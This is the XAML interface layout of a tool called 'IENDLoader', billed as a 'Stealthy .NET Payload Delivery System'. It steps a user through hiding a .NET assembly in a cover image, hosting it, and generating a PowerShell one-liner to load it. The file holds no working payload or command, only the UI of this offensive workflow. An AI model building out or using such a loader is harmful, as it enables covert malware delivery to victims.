<Window x:Class="IENDLoader.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="IENDLoader" Height="700" Width="900"
        WindowStartupLocation="CenterScreen">
  <Grid Margin="20">
    <Grid.RowDefinitions>
      <RowDefinition Height="Auto"/>
      <RowDefinition Height="*"/>
      <RowDefinition Height="Auto"/>
    </Grid.RowDefinitions>

    <!-- Header -->
    <StackPanel Grid.Row="0" Margin="0,0,0,20">
      <TextBlock Text="IENDLOADER" FontSize="28" FontWeight="Bold" HorizontalAlignment="Center"/>
      <TextBlock Text="Stealthy .NET Payload Delivery System" FontSize="14" HorizontalAlignment="Center"/>
    </StackPanel>

    <!-- Main -->
    <ScrollViewer Grid.Row="1" VerticalScrollBarVisibility="Auto">
      <StackPanel>

        <!-- 1. Select .NET Assembly -->
        <TextBlock Text="1. Select .NET Assembly" FontWeight="Bold" Margin="0,10,0,5"/>
        <Grid Margin="0,0,0,15">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="Auto"/>
          </Grid.ColumnDefinitions>
          <TextBlock x:Name="PayloadPathText" Text="No payload selected" VerticalAlignment="Center" Grid.Column="0"/>
          <Button x:Name="BrowsePayloadButton" Content="Browse" Width="100" Height="30"
                  Click="BrowsePayloadButton_Click" Grid.Column="1"/>
        </Grid>

        <!-- 2. Select Cover Image -->
        <TextBlock Text="2. Select Cover Image" FontWeight="Bold" Margin="0,10,0,5"/>
        <Grid Margin="0,0,0,15">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="Auto"/>
          </Grid.ColumnDefinitions>
          <TextBlock x:Name="ImagePathText" Text="No image selected" VerticalAlignment="Center" Grid.Column="0"/>
          <Button x:Name="BrowseImageButton" Content="Browse" Width="100" Height="30"
                  Click="BrowseImageButton_Click" Grid.Column="1"/>
        </Grid>

        <!-- 3. Create Weaponized Image -->
        <TextBlock Text="3. Create Weaponized Image" FontWeight="Bold" Margin="0,10,0,5"/>
        <StackPanel Margin="0,0,0,15">
          <Button x:Name="EmbedButton" Content="Embed Payload" Width="150" Height="32"
                  Click="EmbedButton_Click" />
          <TextBlock x:Name="EmbedStatusText" Text="" Margin="0,5,0,0"/>
          <ProgressBar x:Name="EmbedProgressBar" Visibility="Collapsed" Height="8" Margin="0,5,0,0"/>
        </StackPanel>

        <!-- 3.5 Entry Point Configuration -->
        <TextBlock Text="3.5 Entry Point Configuration" FontWeight="Bold" Margin="0,10,0,5"/>
        <StackPanel Margin="0,0,0,15">
          <Grid Margin="0,0,0,5">
            <Grid.ColumnDefinitions>
              <ColumnDefinition Width="Auto"/>
              <ColumnDefinition Width="Auto"/>
            </Grid.ColumnDefinitions>
            <TextBlock Text="Auto-discover entry point:" VerticalAlignment="Center" Margin="0,0,10,0"/>
            <CheckBox x:Name="AutoEntryPointSwitch"
                      Content="Enabled"
                      IsChecked="True"
                      Checked="AutoEntryPointSwitch_Toggled"
                      Unchecked="AutoEntryPointSwitch_Toggled"
                      Grid.Column="1"/>
          </Grid>

          <Grid x:Name="ManualEntryPointPanel" Visibility="Collapsed">
            <Grid.ColumnDefinitions>
              <ColumnDefinition Width="Auto"/>
              <ColumnDefinition Width="*"/>
            </Grid.ColumnDefinitions>
            <TextBlock Text="Entry Point:" VerticalAlignment="Center" Margin="0,0,10,0"/>
            <TextBox x:Name="EntryPointTextBox" Grid.Column="1" Height="28"/>
          </Grid>
        </StackPanel>

        <!-- 4. Hosted Image URL -->
        <TextBlock Text="4. Hosted Image URL" FontWeight="Bold" Margin="0,10,0,5"/>
        <Grid Margin="0,0,0,15">
          <Grid.ColumnDefinitions>
            <ColumnDefinition Width="*"/>
            <ColumnDefinition Width="Auto"/>
          </Grid.ColumnDefinitions>
          <TextBox x:Name="ImageUrlTextBox" Height="30" VerticalContentAlignment="Center" Grid.Column="0"/>
          <Button x:Name="AutoFillButton" Content="Auto-fill" Width="100" Height="30" Margin="10,0,0,0"
                  Click="AutoFillButton_Click" Grid.Column="1"/>
        </Grid>

        <!-- 5. PowerShell One-Liner -->
        <TextBlock Text="5. PowerShell One-Liner" FontWeight="Bold" Margin="0,10,0,5"/>
        <TextBox x:Name="CommandTextBox"
                 Text="Click 'Generate PowerShell One-Liner' button below..."
                 Height="110"
                 TextWrapping="Wrap"
                 AcceptsReturn="True"
                 VerticalScrollBarVisibility="Auto"
                 IsReadOnly="True"
                 Margin="0,0,0,10"/>
        <StackPanel Orientation="Horizontal" HorizontalAlignment="Center">
          <Button x:Name="GenerateButton" Content="Generate PowerShell One-Liner" Width="250" Height="32"
                  Click="GenerateButton_Click" Margin="0,0,10,0"/>
          <Button x:Name="CopyButton" Content="Copy to Clipboard" Width="160" Height="32"
                  Click="CopyButton_Click"/>
        </StackPanel>

      </StackPanel>
    </ScrollViewer>

    <!-- Status -->
    <TextBlock x:Name="StatusText" Grid.Row="2" Text="Ready" Margin="0,10,0,0"/>
  </Grid>
</Window>
